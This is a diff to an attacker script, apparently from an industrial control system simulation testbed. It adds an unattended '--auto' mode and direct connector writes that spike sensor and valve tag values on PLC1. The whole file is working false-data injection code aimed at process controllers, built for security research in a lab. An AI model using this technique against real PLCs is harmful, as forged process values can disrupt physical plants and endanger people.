@@ -11,17 +11,23 @@ Behavior
 - Spike value can be absolute, multiply (current * factor), or offset (current + delta).
 
 Usage
-    python AttackerSensorSpike.py
+    python AttackerSensorSpike.py              # Interactive mode
+    python AttackerSensorSpike.py --auto       # Non-interactive mode (uses defaults)
 """
 
 import os
+import sys
 import time
 import json
 import logging
 from datetime import datetime, timedelta
 
 from AttackerBase import AttackerBase
-from Configs import TAG
+from Configs import TAG, Controllers
+from ics_sim.connectors import ConnectorFactory
+
+# Check for non-interactive mode
+NON_INTERACTIVE = '--auto' in sys.argv
 
 # Sensible defaults (you can change these or choose interactively on start)
 DEFAULT_TARGETS = [
@@ -37,6 +43,20 @@ class AttackerSensorSpike(AttackerBase):
     def __init__(self):
         super().__init__('attacker_sensor_spike')
 
+        # Create connector to PLC1 (all tags are on PLC1)
+        try:
+            plc_config = Controllers.PLCs[1]  # PLC1
+            connection = {
+                'type': 'hardware',
+                'name': 'PLC1',
+                'path': f"{plc_config['ip']}:{plc_config['port']}"
+            }
+            self.connector = ConnectorFactory.build(connection)
+            self.report(f"Connected to PLC1 at {connection['path']}", logging.INFO)
+        except Exception as e:
+            self.report(f"Failed to create PLC connector: {e}", logging.ERROR)
+            raise
+
         # dedicated per-run log file (in addition to AttackerBase summary)
         self.log_dir = os.path.join('.', 'logs', 'attack-logs')
         os.makedirs(self.log_dir, exist_ok=True)
@@ -50,6 +70,9 @@ class AttackerSensorSpike(AttackerBase):
 
     # ---------- helpers ----------
     def _prompt(self, prompt, default=None):
+        """Prompt for user input, or return default in non-interactive mode."""
+        if NON_INTERACTIVE:
+            return default
         try:
             val = input(prompt)
         except KeyboardInterrupt:
@@ -65,22 +88,33 @@ class AttackerSensorSpike(AttackerBase):
             return default
 
     def _receive_safe(self, tag):
-        """Try to read a tag using _receive, fall back to _get."""
+        """Try to read a tag using the connector."""
         try:
-            v = self._receive(tag)
-        except Exception:
-            try:
-                v = self._get(tag)
-            except Exception:
-                v = None
-        return v
+            tag_id = TAG.TAG_LIST[tag]['id']
+            v = self.connector.get(tag_id)
+            return v
+        except Exception as e:
+            self.report(f"Read failed for {tag}: {e}", logging.ERROR)
+            return None
+
+    def _write_tag(self, tag, value):
+        """Write a value to a tag using the connector."""
+        try:
+            tag_id = TAG.TAG_LIST[tag]['id']
+            self.connector.set(tag_id, value)
+            return True
+        except Exception as e:
+            self.report(f"Write failed for {tag}: {e}", logging.ERROR)
+            return False
 
     # ---------- core ----------
     def _logic(self):
         # 1) Select targets
-        print("\nAvailable default targets (press Enter to accept):")
-        for i, t in enumerate(DEFAULT_TARGETS):
-            print(f"  {i+1}) {t}")
+        if not NON_INTERACTIVE:
+            print("\nAvailable default targets (press Enter to accept):")
+            for i, t in enumerate(DEFAULT_TARGETS):
+                print(f"  {i+1}) {t}")
+        
         raw = self._prompt("Enter comma-separated tag names (or press Enter for defaults): ", "")
         if not raw:
             targets = DEFAULT_TARGETS.copy()
@@ -97,12 +131,12 @@ class AttackerSensorSpike(AttackerBase):
                 if len(matches) == 1:
                     valid.append(matches[0])
                 elif len(matches) > 1:
-                    self.report(f"Ambiguous '{t}', matches {matches} — skipping", logging.WARNING)
+                    self.report(f"Ambiguous '{t}', matches {matches} - skipping", logging.WARNING)
                 else:
-                    self.report(f"Unknown tag '{t}' — skipping", logging.WARNING)
+                    self.report(f"Unknown tag '{t}' - skipping", logging.WARNING)
 
         if not valid:
-            self.report("No valid targets — aborting.")
+            self.report("No valid targets - aborting.")
             return
 
         # 2) Duration
@@ -205,11 +239,9 @@ class AttackerSensorSpike(AttackerBase):
                         if "flow" in t or "valve" in t:
                             spike_val = max(0.0, min(1.5, spike_val))  # allow a bit overrange
 
-                        try:
-                            self._set(t, spike_val)
+                        # Write using connector
+                        if self._write_tag(t, spike_val):
                             self.run_log.info(f"{datetime.now().isoformat()},write,{t},{mode},{spike_val},cur={cur}")
-                        except Exception as e:
-                            self.report(f"Write failed for {t}: {e}", logging.ERROR)
 
                         st["last_write"] = now
 
